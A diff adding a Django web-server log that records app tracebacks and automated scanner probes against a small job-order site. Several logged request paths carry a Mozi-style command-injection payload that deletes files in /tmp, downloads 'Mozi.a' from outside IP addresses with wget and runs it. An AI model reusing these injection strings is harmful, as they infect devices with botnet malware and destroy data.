+  File "/usr/local/lib64/python3.6/site-packages/django/db/backends/utils.py", line 66, in execute
+    return self._execute_with_wrappers(sql, params, many=False, executor=self._execute)
+  File "/usr/local/lib64/python3.6/site-packages/django/db/backends/utils.py", line 75, in _execute_with_wrappers
+    return executor(sql, params, many, context)
+  File "/usr/local/lib64/python3.6/site-packages/django/db/backends/utils.py", line 84, in _execute
+    return self.cursor.execute(sql, params)
+  File "/usr/local/lib64/python3.6/site-packages/django/db/utils.py", line 90, in __exit__
+    raise dj_exc_value.with_traceback(traceback) from exc_value
+  File "/usr/local/lib64/python3.6/site-packages/django/db/backends/utils.py", line 84, in _execute
+    return self.cursor.execute(sql, params)
+  File "/usr/local/lib64/python3.6/site-packages/django/db/backends/sqlite3/base.py", line 423, in execute
+    return Database.Cursor.execute(self, query, params)
+django.db.utils.IntegrityError: UNIQUE constraint failed: appa_userinfo.username
+2022-03-15 09:05:03,656 [uWSGIWorker1Core0:139907253844160] [django.request:230] [log:log_response] [WARNING]- Not Found: /admin/login
+2022-03-15 09:05:04,921 [uWSGIWorker1Core0:139907253844160] [django.request:230] [log:log_response] [WARNING]- Not Found: /login.cgi
+2022-03-15 09:05:09,697 [uWSGIWorker1Core0:139907253844160] [django.request:230] [log:log_response] [WARNING]- Not Found: /admin/login
+2022-03-15 09:07:45,832 [uWSGIWorker1Core0:139907253844160] [django.request:230] [log:log_response] [WARNING]- Not Found: /admin/login
+2022-03-15 09:10:14,053 [uWSGIWorker1Core0:139907253844160] [django.request:230] [log:log_response] [ERROR]- Internal Server Error: /admin/
+Traceback (most recent call last):
+  File "/usr/local/lib64/python3.6/site-packages/django/db/backends/utils.py", line 84, in _execute
+    return self.cursor.execute(sql, params)
+  File "/usr/local/lib64/python3.6/site-packages/django/db/backends/sqlite3/base.py", line 423, in execute
+    return Database.Cursor.execute(self, query, params)
+sqlite3.IntegrityError: UNIQUE constraint failed: appa_userinfo.username
+
+The above exception was the direct cause of the following exception:
+
+Traceback (most recent call last):
+  File "/usr/local/lib64/python3.6/site-packages/django/core/handlers/exception.py", line 47, in inner
+    response = get_response(request)
+  File "/usr/local/lib64/python3.6/site-packages/django/core/handlers/base.py", line 181, in _get_response
+    response = wrapped_callback(request, *callback_args, **callback_kwargs)
+  File "/root/liekiewaa/web/jobordera/appa/views.py", line 92, in admin
+    data = adminadd(username, usercode, usertype)
+  File "/root/liekiewaa/web/jobordera/appa/views.py", line 37, in adminadd
+    userinfo.objects.create(userid=k+1,username=ausername, password=busercode, type=cusertype)
+  File "/usr/local/lib64/python3.6/site-packages/django/db/models/manager.py", line 85, in manager_method
+    return getattr(self.get_queryset(), name)(*args, **kwargs)
+  File "/usr/local/lib64/python3.6/site-packages/django/db/models/query.py", line 453, in create
+    obj.save(force_insert=True, using=self.db)
+  File "/usr/local/lib64/python3.6/site-packages/django/db/models/base.py", line 740, in save
+    force_update=force_update, update_fields=update_fields)
+  File "/usr/local/lib64/python3.6/site-packages/django/db/models/base.py", line 778, in save_base
+    force_update, using, update_fields,
+  File "/usr/local/lib64/python3.6/site-packages/django/db/models/base.py", line 881, in _save_table
+    results = self._do_insert(cls._base_manager, using, fields, returning_fields, raw)
+  File "/usr/local/lib64/python3.6/site-packages/django/db/models/base.py", line 921, in _do_insert
+    using=using, raw=raw,
+  File "/usr/local/lib64/python3.6/site-packages/django/db/models/manager.py", line 85, in manager_method
+    return getattr(self.get_queryset(), name)(*args, **kwargs)
+  File "/usr/local/lib64/python3.6/site-packages/django/db/models/query.py", line 1270, in _insert
+    return query.get_compiler(using=using).execute_sql(returning_fields)
+  File "/usr/local/lib64/python3.6/site-packages/django/db/models/sql/compiler.py", line 1416, in execute_sql
+    cursor.execute(sql, params)
+  File "/usr/local/lib64/python3.6/site-packages/django/db/backends/utils.py", line 98, in execute
+    return super().execute(sql, params)
+  File "/usr/local/lib64/python3.6/site-packages/django/db/backends/utils.py", line 66, in execute
+    return self._execute_with_wrappers(sql, params, many=False, executor=self._execute)
+  File "/usr/local/lib64/python3.6/site-packages/django/db/backends/utils.py", line 75, in _execute_with_wrappers
+    return executor(sql, params, many, context)
+  File "/usr/local/lib64/python3.6/site-packages/django/db/backends/utils.py", line 84, in _execute
+    return self.cursor.execute(sql, params)
+  File "/usr/local/lib64/python3.6/site-packages/django/db/utils.py", line 90, in __exit__
+    raise dj_exc_value.with_traceback(traceback) from exc_value
+  File "/usr/local/lib64/python3.6/site-packages/django/db/backends/utils.py", line 84, in _execute
+    return self.cursor.execute(sql, params)
+  File "/usr/local/lib64/python3.6/site-packages/django/db/backends/sqlite3/base.py", line 423, in execute
+    return Database.Cursor.execute(self, query, params)
+django.db.utils.IntegrityError: UNIQUE constraint failed: appa_userinfo.username
+2022-03-15 09:10:26,768 [uWSGIWorker1Core0:139907253844160] [django.request:230] [log:log_response] [WARNING]- Not Found: /admin/login
+2022-03-15 09:14:10,074 [uWSGIWorker1Core0:140078856423616] [django.request:230] [log:log_response] [ERROR]- Internal Server Error: /use/
+Traceback (most recent call last):
+  File "/usr/local/lib64/python3.6/site-packages/django/core/handlers/exception.py", line 47, in inner
+    response = get_response(request)
+  File "/usr/local/lib64/python3.6/site-packages/django/core/handlers/base.py", line 181, in _get_response
+    response = wrapped_callback(request, *callback_args, **callback_kwargs)
+  File "/root/liekiewaa/web/jobordera/appa/views.py", line 95, in use
+    status = request.COOIES.get("name")
+AttributeError: 'WSGIRequest' object has no attribute 'COOIES'
+2022-03-15 09:46:17,453 [uWSGIWorker1Core0:140664577030336] [django.request:230] [log:log_response] [WARNING]- Not Found: /*
+2022-03-15 10:37:03,701 [uWSGIWorker1Core0:140664577030336] [django.request:230] [log:log_response] [WARNING]- Not Found: /ftptest.cgi
+2022-03-15 11:00:38,492 [uWSGIWorker1Core0:140664577030336] [django.request:230] [log:log_response] [WARNING]- Not Found: /favicon.ico
+2022-03-15 11:10:02,842 [uWSGIWorker1Core0:140664577030336] [django.request:230] [log:log_response] [WARNING]- Not Found: /favicon.ico
+2022-03-15 11:11:28,065 [uWSGIWorker1Core0:140664577030336] [django.request:230] [log:log_response] [WARNING]- Not Found: /ftptest.cgi
+2022-03-15 11:43:55,935 [uWSGIWorker1Core0:140664577030336] [django.request:230] [log:log_response] [WARNING]- Not Found: /ftptest.cgi
+2022-03-15 13:03:24,593 [uWSGIWorker1Core0:140664577030336] [django.request:230] [log:log_response] [WARNING]- Not Found: /ftptest.cgi
+2022-03-15 13:18:14,031 [uWSGIWorker1Core0:140664577030336] [django.request:230] [log:log_response] [WARNING]- Not Found: /login.cgi
+2022-03-15 13:19:54,912 [uWSGIWorker1Core0:140664577030336] [django.request:230] [log:log_response] [WARNING]- Not Found: /login.cgi
+2022-03-15 14:42:27,189 [uWSGIWorker1Core0:140664577030336] [django.request:230] [log:log_response] [WARNING]- Not Found: /favicon.ico
+2022-03-15 14:42:27,251 [uWSGIWorker1Core0:140664577030336] [django.request:230] [log:log_response] [WARNING]- Not Found: /robots.txt
+2022-03-15 15:10:09,636 [uWSGIWorker1Core0:140664577030336] [django.request:230] [log:log_response] [WARNING]- Not Found: /login.cgi
+2022-03-15 15:55:22,067 [uWSGIWorker1Core0:140664577030336] [django.request:230] [log:log_response] [WARNING]- Not Found: /login.cgi
+2022-03-15 16:48:33,104 [uWSGIWorker1Core0:140664577030336] [django.request:230] [log:log_response] [WARNING]- Not Found: /ftptest.cgi
+2022-03-15 17:00:10,771 [uWSGIWorker1Core0:140664577030336] [django.request:230] [log:log_response] [WARNING]- Not Found: /login.cgi
+2022-03-15 19:27:58,291 [uWSGIWorker1Core0:140664577030336] [django.request:230] [log:log_response] [WARNING]- Not Found: /ftptest.cgi
+2022-03-15 21:59:31,694 [uWSGIWorker1Core0:140664577030336] [django.request:230] [log:log_response] [WARNING]- Not Found: /login.cgi
+2022-03-15 22:15:29,124 [uWSGIWorker1Core0:140664577030336] [django.request:230] [log:log_response] [WARNING]- Not Found: /login.cgi
+2022-03-15 22:52:12,990 [uWSGIWorker1Core0:140664577030336] [django.request:230] [log:log_response] [WARNING]- Not Found: /login.cgi
+2022-03-15 23:10:12,731 [uWSGIWorker1Core0:140664577030336] [django.request:230] [log:log_response] [WARNING]- Not Found: /login.cgi
+2022-03-15 23:30:19,366 [uWSGIWorker1Core0:140664577030336] [django.request:230] [log:log_response] [WARNING]- Not Found: /login.cgi
+2022-03-15 23:32:38,400 [uWSGIWorker1Core0:140664577030336] [django.request:230] [log:log_response] [WARNING]- Not Found: /robots.txt
+2022-03-15 23:36:21,892 [uWSGIWorker1Core0:140664577030336] [django.request:230] [log:log_response] [WARNING]- Not Found: /login.cgi
+2022-03-16 00:16:33,554 [uWSGIWorker1Core0:140664577030336] [django.request:230] [log:log_response] [WARNING]- Not Found: /favicon.ico
+2022-03-16 00:22:51,684 [uWSGIWorker1Core0:140664577030336] [django.request:230] [log:log_response] [WARNING]- Not Found: /login.cgi
+2022-03-16 00:25:22,483 [uWSGIWorker1Core0:140664577030336] [django.request:230] [log:log_response] [WARNING]- Not Found: /favicon.ico
+2022-03-16 00:50:22,052 [uWSGIWorker1Core0:140664577030336] [django.request:230] [log:log_response] [ERROR]- Internal Server Error: /use/
+Traceback (most recent call last):
+  File "/usr/local/lib64/python3.6/site-packages/django/core/handlers/exception.py", line 47, in inner
+    response = get_response(request)
+  File "/usr/local/lib64/python3.6/site-packages/django/core/handlers/base.py", line 181, in _get_response
+    response = wrapped_callback(request, *callback_args, **callback_kwargs)
+  File "/root/liekiewaa/web/jobordera/appa/views.py", line 105, in use
+    data = serch(btime,etime)
+  File "/root/liekiewaa/web/jobordera/appa/views.py", line 42, in serch
+    print(b,e)
+OSError: [Errno 5] Input/output error
+2022-03-16 00:50:33,285 [uWSGIWorker1Core0:140664577030336] [django.request:230] [log:log_response] [ERROR]- Internal Server Error: /use/
+Traceback (most recent call last):
+  File "/usr/local/lib64/python3.6/site-packages/django/core/handlers/exception.py", line 47, in inner
+    response = get_response(request)
+  File "/usr/local/lib64/python3.6/site-packages/django/core/handlers/base.py", line 181, in _get_response
+    response = wrapped_callback(request, *callback_args, **callback_kwargs)
+  File "/root/liekiewaa/web/jobordera/appa/views.py", line 105, in use
+    data = serch(btime,etime)
+  File "/root/liekiewaa/web/jobordera/appa/views.py", line 42, in serch
+    print(b,e)
+OSError: [Errno 5] Input/output error
+2022-03-16 01:29:29,535 [uWSGIWorker1Core0:140288697374912] [django.request:230] [log:log_response] [WARNING]- Not Found: /login.cgi
+2022-03-16 02:59:31,548 [uWSGIWorker1Core0:140288697374912] [django.request:230] [log:log_response] [WARNING]- Not Found: /login.cgi
+2022-03-16 03:08:34,748 [uWSGIWorker1Core0:140288697374912] [django.request:230] [log:log_response] [WARNING]- Not Found: /login.cgi
+2022-03-16 03:15:42,063 [uWSGIWorker1Core0:140288697374912] [django.request:230] [log:log_response] [WARNING]- Not Found: /login.cgi
+2022-03-16 04:24:13,222 [uWSGIWorker1Core0:140288697374912] [django.request:230] [log:log_response] [WARNING]- Not Found: /login.cgi
+2022-03-16 05:03:52,035 [uWSGIWorker1Core0:140288697374912] [django.request:230] [log:log_response] [WARNING]- Not Found: /login.cgi
+2022-03-16 05:40:56,320 [uWSGIWorker1Core0:140288697374912] [django.request:230] [log:log_response] [WARNING]- Not Found: /login.cgi
+2022-03-16 06:03:31,536 [uWSGIWorker1Core0:140288697374912] [django.request:230] [log:log_response] [WARNING]- Not Found: /login.cgi
+2022-03-16 06:51:28,269 [uWSGIWorker1Core0:140288697374912] [django.request:230] [log:log_response] [WARNING]- Not Found: /login.cgi
+2022-03-16 07:36:55,512 [uWSGIWorker1Core0:140288697374912] [django.request:230] [log:log_response] [WARNING]- Not Found: /favicon.ico
+2022-03-16 07:37:42,657 [uWSGIWorker1Core0:140288697374912] [django.request:230] [log:log_response] [WARNING]- Not Found: /favicon.ico
+2022-03-16 07:37:42,747 [uWSGIWorker1Core0:140288697374912] [django.request:230] [log:log_response] [WARNING]- Not Found: /robots.txt
+2022-03-16 07:37:42,832 [uWSGIWorker1Core0:140288697374912] [django.request:230] [log:log_response] [WARNING]- Not Found: /sitemap.xml
+2022-03-16 08:07:15,657 [uWSGIWorker1Core0:140288697374912] [django.request:230] [log:log_response] [WARNING]- Not Found: /ftptest.cgi
+2022-03-16 08:19:23,361 [uWSGIWorker1Core0:140288697374912] [django.request:230] [log:log_response] [WARNING]- Not Found: /login.cgi
+2022-03-16 09:07:38,274 [uWSGIWorker1Core0:140288697374912] [django.request:230] [log:log_response] [WARNING]- Not Found: /ftptest.cgi
+2022-03-16 09:16:27,532 [uWSGIWorker1Core0:140288697374912] [django.request:230] [log:log_response] [WARNING]- Not Found: /login.cgi
+2022-03-16 09:30:53,375 [uWSGIWorker1Core0:140288697374912] [django.request:230] [log:log_response] [WARNING]- Not Found: /ftptest.cgi
+2022-03-16 09:50:37,480 [uWSGIWorker1Core0:140288697374912] [django.request:230] [log:log_response] [WARNING]- Not Found: /login.cgi
+2022-03-16 10:27:35,588 [uWSGIWorker1Core0:140288697374912] [django.request:230] [log:log_response] [WARNING]- Not Found: /login.cgi
+2022-03-16 11:04:58,594 [uWSGIWorker1Core0:140288697374912] [django.request:230] [log:log_response] [WARNING]- Not Found: /login.cgi
+2022-03-16 11:12:00,107 [uWSGIWorker1Core0:140288697374912] [django.request:230] [log:log_response] [WARNING]- Not Found: /login.cgi
+2022-03-16 12:42:36,955 [uWSGIWorker1Core0:140288697374912] [django.request:230] [log:log_response] [WARNING]- Not Found: /login.cgi
+2022-03-16 12:44:57,883 [uWSGIWorker1Core0:140288697374912] [django.request:230] [log:log_response] [ERROR]- Internal Server Error: /
+Traceback (most recent call last):
+  File "/usr/local/lib64/python3.6/site-packages/django/core/handlers/exception.py", line 47, in inner
+    response = get_response(request)
+  File "/usr/local/lib64/python3.6/site-packages/django/core/handlers/base.py", line 188, in _get_response
+    self.check_response(response, callback)
+  File "/usr/local/lib64/python3.6/site-packages/django/core/handlers/base.py", line 311, in check_response
+    "instead." % name
+ValueError: The view appa.views.login didn't return an HttpResponse object. It returned None instead.
+2022-03-16 12:45:07,671 [uWSGIWorker1Core0:140288697374912] [django.request:230] [log:log_response] [WARNING]- Not Found: /nice ports,/Trinity.txt.bak
+2022-03-16 12:45:10,599 [uWSGIWorker1Core0:140288697374912] [django.request:230] [log:log_response] [ERROR]- Internal Server Error: /
+Traceback (most recent call last):
+  File "/usr/local/lib64/python3.6/site-packages/django/core/handlers/exception.py", line 47, in inner
+    response = get_response(request)
+  File "/usr/local/lib64/python3.6/site-packages/django/core/handlers/base.py", line 188, in _get_response
+    self.check_response(response, callback)
+  File "/usr/local/lib64/python3.6/site-packages/django/core/handlers/base.py", line 311, in check_response
+    "instead." % name
+ValueError: The view appa.views.login didn't return an HttpResponse object. It returned None instead.
+2022-03-16 12:45:11,808 [uWSGIWorker1Core0:140288697374912] [django.request:230] [log:log_response] [WARNING]- Not Found: /sip:nm
+2022-03-16 13:12:31,375 [uWSGIWorker1Core0:140288697374912] [django.request:230] [log:log_response] [WARNING]- Not Found: /ftptest.cgi
+2022-03-16 13:33:01,727 [uWSGIWorker1Core0:140288697374912] [django.request:230] [log:log_response] [WARNING]- Not Found: /ftptest.cgi
+2022-03-16 13:46:25,878 [uWSGIWorker1Core0:140288697374912] [django.request:230] [log:log_response] [WARNING]- Not Found: /login.cgi
+2022-03-16 13:53:37,361 [uWSGIWorker1Core0:140288697374912] [django.request:230] [log:log_response] [WARNING]- Not Found: /login.cgi
+2022-03-16 14:08:35,823 [uWSGIWorker1Core0:140288697374912] [django.request:230] [log:log_response] [WARNING]- Not Found: /ftptest.cgi
+2022-03-16 14:31:27,559 [uWSGIWorker1Core0:140288697374912] [django.request:230] [log:log_response] [WARNING]- Not Found: /ftptest.cgi
+2022-03-16 15:04:08,398 [uWSGIWorker1Core0:140288697374912] [django.request:230] [log:log_response] [WARNING]- Not Found: /login.cgi
+2022-03-16 17:51:29,379 [uWSGIWorker1Core0:140288697374912] [django.request:230] [log:log_response] [WARNING]- Not Found: /login.cgi
+2022-03-16 18:39:10,647 [uWSGIWorker1Core0:140288697374912] [django.request:230] [log:log_response] [WARNING]- Not Found: /*
+2022-03-16 18:50:08,248 [uWSGIWorker1Core0:140288697374912] [django.request:230] [log:log_response] [WARNING]- Not Found: /ftptest.cgi
+2022-03-16 18:56:57,675 [uWSGIWorker1Core0:140288697374912] [django.request:230] [log:log_response] [WARNING]- Not Found: /login.cgi
+2022-03-16 19:18:07,247 [uWSGIWorker1Core0:140288697374912] [django.request:230] [log:log_response] [WARNING]- Not Found: /login.cgi
+2022-03-16 20:11:47,917 [uWSGIWorker1Core0:140288697374912] [django.request:230] [log:log_response] [WARNING]- Not Found: /ftptest.cgi
+2022-03-16 22:04:36,403 [uWSGIWorker1Core0:140288697374912] [django.request:230] [log:log_response] [WARNING]- Not Found: /login.cgi
+2022-03-16 23:22:22,813 [uWSGIWorker1Core0:140288697374912] [django.request:230] [log:log_response] [WARNING]- Not Found: /login.cgi
+2022-03-16 23:42:35,537 [uWSGIWorker1Core0:140288697374912] [django.request:230] [log:log_response] [WARNING]- Not Found: /login.cgi
+2022-03-17 01:52:51,606 [uWSGIWorker1Core0:140288697374912] [django.request:230] [log:log_response] [WARNING]- Not Found: /login.cgi
+2022-03-17 01:57:51,134 [uWSGIWorker1Core0:140288697374912] [django.request:230] [log:log_response] [WARNING]- Not Found: /login.cgi
+2022-03-17 02:15:06,085 [uWSGIWorker1Core0:140288697374912] [django.request:230] [log:log_response] [WARNING]- Not Found: /language/Swedish${IFS}&&cd${IFS}/tmp;rm${IFS}-rf${IFS}*;wget${IFS}http://192.168.1.1:8088/Mozi.a;sh${IFS}/tmp/Mozi.a&>r&&tar${IFS}/string.js
+2022-03-17 02:50:30,068 [uWSGIWorker1Core0:140288697374912] [django.request:230] [log:log_response] [WARNING]- Not Found: /login.cgi
+2022-03-17 03:06:57,854 [uWSGIWorker1Core0:140288697374912] [django.request:230] [log:log_response] [WARNING]- Not Found: /login.cgi
+2022-03-17 04:48:49,357 [uWSGIWorker1Core0:140288697374912] [django.request:230] [log:log_response] [WARNING]- Not Found: /login.cgi
+2022-03-17 06:54:07,941 [uWSGIWorker1Core0:140288697374912] [django.request:230] [log:log_response] [ERROR]- Internal Server Error: /admin/
+Traceback (most recent call last):
+  File "/usr/local/lib64/python3.6/site-packages/django/core/handlers/exception.py", line 47, in inner
+    response = get_response(request)
+  File "/usr/local/lib64/python3.6/site-packages/django/core/handlers/base.py", line 181, in _get_response
+    response = wrapped_callback(request, *callback_args, **callback_kwargs)
+  File "/root/liekiewaa/web/jobordera/appa/views.py", line 83, in admin
+    if (status is None) | (request.session['userkind']!='adminer'):
+  File "/usr/local/lib64/python3.6/site-packages/django/contrib/sessions/backends/base.py", line 65, in __getitem__
+    return self._session[key]
+KeyError: 'userkind'
+2022-03-17 07:22:52,426 [uWSGIWorker1Core0:140288697374912] [django.request:230] [log:log_response] [WARNING]- Not Found: /login.cgi
+2022-03-17 08:02:49,449 [uWSGIWorker1Core0:140288697374912] [django.request:230] [log:log_response] [WARNING]- Not Found: /login.cgi
+2022-03-17 09:35:14,038 [uWSGIWorker1Core0:140288697374912] [django.request:230] [log:log_response] [WARNING]- Not Found: /login.cgi
+2022-03-17 09:35:33,537 [uWSGIWorker1Core0:140288697374912] [django.request:230] [log:log_response] [WARNING]- Not Found: /ftptest.cgi
+2022-03-17 11:00:46,785 [uWSGIWorker1Core0:140288697374912] [django.request:230] [log:log_response] [WARNING]- Not Found: /login.cgi
+2022-03-17 11:26:58,586 [uWSGIWorker1Core0:140288697374912] [django.request:230] [log:log_response] [WARNING]- Not Found: /ftptest.cgi
+2022-03-17 12:53:04,646 [uWSGIWorker1Core0:140288697374912] [django.request:230] [log:log_response] [ERROR]- Internal Server Error: /
+Traceback (most recent call last):
+  File "/usr/local/lib64/python3.6/site-packages/django/core/handlers/exception.py", line 47, in inner
+    response = get_response(request)
+  File "/usr/local/lib64/python3.6/site-packages/django/core/handlers/base.py", line 188, in _get_response
+    self.check_response(response, callback)
+  File "/usr/local/lib64/python3.6/site-packages/django/core/handlers/base.py", line 311, in check_response
+    "instead." % name
+ValueError: The view appa.views.login didn't return an HttpResponse object. It returned None instead.
+2022-03-17 12:53:14,560 [uWSGIWorker1Core0:140288697374912] [django.request:230] [log:log_response] [WARNING]- Not Found: /nice ports,/Trinity.txt.bak
+2022-03-17 12:53:16,996 [uWSGIWorker1Core0:140288697374912] [django.request:230] [log:log_response] [ERROR]- Internal Server Error: /
+Traceback (most recent call last):
+  File "/usr/local/lib64/python3.6/site-packages/django/core/handlers/exception.py", line 47, in inner
+    response = get_response(request)
+  File "/usr/local/lib64/python3.6/site-packages/django/core/handlers/base.py", line 188, in _get_response
+    self.check_response(response, callback)
+  File "/usr/local/lib64/python3.6/site-packages/django/core/handlers/base.py", line 311, in check_response
+    "instead." % name
+ValueError: The view appa.views.login didn't return an HttpResponse object. It returned None instead.
+2022-03-17 12:53:17,580 [uWSGIWorker1Core0:140288697374912] [django.request:230] [log:log_response] [WARNING]- Not Found: /sip:nm
+2022-03-17 13:20:36,425 [uWSGIWorker1Core0:140288697374912] [django.request:230] [log:log_response] [WARNING]- Not Found: /login.cgi
+2022-03-17 13:23:13,917 [uWSGIWorker1Core0:140288697374912] [django.request:230] [log:log_response] [WARNING]- Not Found: /language/Swedish${IFS}&&cd${IFS}/tmp;rm${IFS}-rf${IFS}*;wget${IFS}http://112.248.186.35:48470/Mozi.a;sh${IFS}/tmp/Mozi.a&>r&&tar${IFS}/string.js
+2022-03-17 13:33:44,327 [uWSGIWorker1Core0:140288697374912] [django.request:230] [log:log_response] [WARNING]- Not Found: /login.cgi
+2022-03-17 13:42:03,928 [uWSGIWorker1Core0:140288697374912] [django.request:230] [log:log_response] [WARNING]- Not Found: /favicon.ico
+2022-03-17 13:57:12,894 [uWSGIWorker1Core0:140288697374912] [django.request:230] [log:log_response] [WARNING]- Not Found: /ftptest.cgi
+2022-03-17 16:12:52,757 [uWSGIWorker1Core0:140288697374912] [django.request:230] [log:log_response] [WARNING]- Not Found: /login.cgi
+2022-03-17 17:25:35,505 [uWSGIWorker1Core0:140288697374912] [django.request:230] [log:log_response] [WARNING]- Not Found: /login.cgi
+2022-03-17 17:42:23,752 [uWSGIWorker1Core0:140288697374912] [django.request:230] [log:log_response] [WARNING]- Not Found: /login.cgi
+2022-03-17 17:53:39,106 [uWSGIWorker1Core0:140288697374912] [django.request:230] [log:log_response] [ERROR]- Internal Server Error: /
+Traceback (most recent call last):
+  File "/usr/local/lib64/python3.6/site-packages/django/core/handlers/exception.py", line 47, in inner
+    response = get_response(request)
+  File "/usr/local/lib64/python3.6/site-packages/django/core/handlers/base.py", line 188, in _get_response
+    self.check_response(response, callback)
+  File "/usr/local/lib64/python3.6/site-packages/django/core/handlers/base.py", line 311, in check_response
+    "instead." % name
+ValueError: The view appa.views.login didn't return an HttpResponse object. It returned None instead.
+2022-03-17 18:01:07,903 [uWSGIWorker1Core0:140288697374912] [django.request:230] [log:log_response] [WARNING]- Not Found: /login.cgi
+2022-03-17 18:57:43,181 [uWSGIWorker1Core0:140288697374912] [django.request:230] [log:log_response] [WARNING]- Not Found: /ftptest.cgi
+2022-03-17 21:31:25,635 [uWSGIWorker1Core0:140288697374912] [django.request:230] [log:log_response] [WARNING]- Not Found: /language/Swedish${IFS}&&cd${IFS}/tmp;rm${IFS}-rf${IFS}*;wget${IFS}http://119.178.176.30:34146/Mozi.a;sh${IFS}/tmp/Mozi.a&>r&&tar${IFS}/string.js
+2022-03-17 22:25:15,853 [uWSGIWorker1Core0:140288697374912] [django.request:230] [log:log_response] [WARNING]- Not Found: /*
+2022-03-17 22:27:04,190 [uWSGIWorker1Core0:140288697374912] [django.request:230] [log:log_response] [WARNING]- Not Found: /login.cgi
+2022-03-17 22:29:28,133 [uWSGIWorker1Core0:140288697374912] [django.request:230] [log:log_response] [WARNING]- Not Found: /login.cgi
+2022-03-18 01:47:27,029 [uWSGIWorker1Core0:140288697374912] [django.request:230] [log:log_response] [WARNING]- Not Found: /login.cgi
+2022-03-18 02:25:27,597 [uWSGIWorker1Core0:140288697374912] [django.request:230] [log:log_response] [WARNING]- Not Found: /login.cgi
+2022-03-18 02:26:34,569 [uWSGIWorker1Core0:140288697374912] [django.request:230] [log:log_response] [WARNING]- Not Found: /login.cgi
+2022-03-18 03:42:20,986 [uWSGIWorker1Core0:140288697374912] [django.request:230] [log:log_response] [WARNING]- Not Found: /login.cgi
+2022-03-18 04:28:22,788 [uWSGIWorker1Core0:140288697374912] [django.request:230] [log:log_response] [WARNING]- Not Found: /login.cgi
+2022-03-18 05:34:04,539 [uWSGIWorker1Core0:140288697374912] [django.request:230] [log:log_response] [WARNING]- Not Found: /login.cgi
+2022-03-18 05:38:48,792 [uWSGIWorker1Core0:140288697374912] [django.request:230] [log:log_response] [WARNING]- Not Found: /login.cgi
+2022-03-18 06:18:32,683 [uWSGIWorker1Core0:140288697374912] [django.request:230] [log:log_response] [WARNING]- Not Found: /login.cgi
+2022-03-18 06:19:31,148 [uWSGIWorker1Core0:140288697374912] [django.request:230] [log:log_response] [WARNING]- Not Found: /ftptest.cgi
+2022-03-18 06:41:09,145 [uWSGIWorker1Core0:140288697374912] [django.request:230] [log:log_response] [ERROR]- Internal Server Error: /
+Traceback (most recent call last):
+  File "/usr/local/lib64/python3.6/site-packages/django/core/handlers/exception.py", line 47, in inner
+    response = get_response(request)
+  File "/usr/local/lib64/python3.6/site-packages/django/core/handlers/base.py", line 188, in _get_response
+    self.check_response(response, callback)
+  File "/usr/local/lib64/python3.6/site-packages/django/core/handlers/base.py", line 311, in check_response
+    "instead." % name
+ValueError: The view appa.views.login didn't return an HttpResponse object. It returned None instead.
+2022-03-18 06:41:10,271 [uWSGIWorker1Core0:140288697374912] [django.request:230] [log:log_response] [ERROR]- Internal Server Error: /
+Traceback (most recent call last):
+  File "/usr/local/lib64/python3.6/site-packages/django/core/handlers/exception.py", line 47, in inner
+    response = get_response(request)
+  File "/usr/local/lib64/python3.6/site-packages/django/core/handlers/base.py", line 188, in _get_response
+    self.check_response(response, callback)
+  File "/usr/local/lib64/python3.6/site-packages/django/core/handlers/base.py", line 311, in check_response
+    "instead." % name
+ValueError: The view appa.views.login didn't return an HttpResponse object. It returned None instead.
+2022-03-18 07:27:37,587 [uWSGIWorker1Core0:140288697374912] [django.request:230] [log:log_response] [WARNING]- Not Found: /favicon.ico
+2022-03-18 07:27:38,050 [uWSGIWorker1Core0:140288697374912] [django.request:230] [log:log_response] [WARNING]- Not Found: /robots.txt
+2022-03-18 07:27:38,487 [uWSGIWorker1Core0:140288697374912] [django.request:230] [log:log_response] [WARNING]- Not Found: /sitemap.xml
+2022-03-18 07:59:34,309 [uWSGIWorker1Core0:140288697374912] [django.request:230] [log:log_response] [WARNING]- Not Found: /login.cgi
+2022-03-18 08:40:26,464 [uWSGIWorker1Core0:140288697374912] [django.request:230] [log:log_response] [WARNING]- Not Found: /ftptest.cgi
+2022-03-18 08:49:19,568 [uWSGIWorker1Core0:140288697374912] [django.request:230] [log:log_response] [ERROR]- Internal Server Error: /
+Traceback (most recent call last):
+  File "/usr/local/lib64/python3.6/site-packages/django/core/handlers/exception.py", line 47, in inner
+    response = get_response(request)
+  File "/usr/local/lib64/python3.6/site-packages/django/core/handlers/base.py", line 188, in _get_response
+    self.check_response(response, callback)
+  File "/usr/local/lib64/python3.6/site-packages/django/core/handlers/base.py", line 311, in check_response
+    "instead." % name
+ValueError: The view appa.views.login didn't return an HttpResponse object. It returned None instead.
+2022-03-18 08:49:26,558 [uWSGIWorker1Core0:140288697374912] [django.request:230] [log:log_response] [WARNING]- Not Found: /nice ports,/Trinity.txt.bak
+2022-03-18 08:49:28,141 [uWSGIWorker1Core0:140288697374912] [django.request:230] [log:log_response] [ERROR]- Internal Server Error: /
+Traceback (most recent call last):
+  File "/usr/local/lib64/python3.6/site-packages/django/core/handlers/exception.py", line 47, in inner
+    response = get_response(request)
+  File "/usr/local/lib64/python3.6/site-packages/django/core/handlers/base.py", line 188, in _get_response
+    self.check_response(response, callback)
+  File "/usr/local/lib64/python3.6/site-packages/django/core/handlers/base.py", line 311, in check_response
+    "instead." % name
+ValueError: The view appa.views.login didn't return an HttpResponse object. It returned None instead.
+2022-03-18 08:49:29,150 [uWSGIWorker1Core0:140288697374912] [django.request:230] [log:log_response] [WARNING]- Not Found: /sip:nm
+2022-03-18 08:58:49,104 [uWSGIWorker1Core0:140288697374912] [django.request:230] [log:log_response] [WARNING]- Not Found: /favicon.ico
+2022-03-18 09:10:55,393 [uWSGIWorker1Core0:140288697374912] [django.request:230] [log:log_response] [WARNING]- Not Found: /login.cgi
+2022-03-18 09:21:34,277 [uWSGIWorker1Core0:140288697374912] [django.request:230] [log:log_response] [WARNING]- Not Found: /language/Swedish${IFS}&&cd${IFS}/tmp;rm${IFS}-rf${IFS}*;wget${IFS}http://192.168.1.1:8088/Mozi.a;sh${IFS}/tmp/Mozi.a&>r&&tar${IFS}/string.js
+2022-03-18 09:37:43,067 [uWSGIWorker1Core0:140288697374912] [django.request:230] [log:log_response] [WARNING]- Not Found: /login.cgi
+2022-03-18 10:25:29,068 [uWSGIWorker1Core0:140288697374912] [django.request:230] [log:log_response] [WARNING]- Not Found: /login.cgi
+2022-03-18 10:51:39,637 [uWSGIWorker1Core0:140288697374912] [django.request:230] [log:log_response] [WARNING]- Not Found: /login.cgi
+2022-03-18 13:58:04,155 [uWSGIWorker1Core0:140288697374912] [django.request:230] [log:log_response] [WARNING]- Not Found: /ftptest.cgi
